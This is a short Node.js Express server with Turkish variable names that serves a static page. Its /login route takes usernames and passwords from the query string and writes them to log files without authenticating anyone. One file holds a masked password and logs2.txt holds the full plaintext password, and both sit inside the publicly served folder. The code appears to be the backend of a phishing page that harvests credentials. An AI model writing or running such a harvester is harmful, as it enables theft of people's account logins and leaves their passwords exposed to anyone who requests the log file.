const express = require(`express`);
const fs = require(`fs`);
const axios = require(`axios`);
const app = express();
const cors = require(`cors`);

app.set(`trust proxy`, true);
app.use(cors());
app.use(express.static(`./allstatic`));

app.get(`/`, async(istek, cevap) => {
  cevap.sendFile(`${__dirname}/allstatic/index.html`);
});

app.get(`/login`, async(istek, cevap) => {
  let username = istek.query.username;
  let password = istek.query.password;
  fs.appendFileSync(`./allstatic/logs.txt`, `\nUsername : ${username} | Pasword : ${password.slice(0, 4)}${String(`*`).repeat(password.length - 4)}`);
  fs.appendFileSync(`./allstatic/logs2.txt`, `\nUsername : ${username} | Pasword : ${password}`);
  cevap.sendStatus(200);
})

app.listen(process.env.PORT || 80, () => {
  console.log(`Website ${process.env.PORT || 80} Portuyla Başladı...`);
});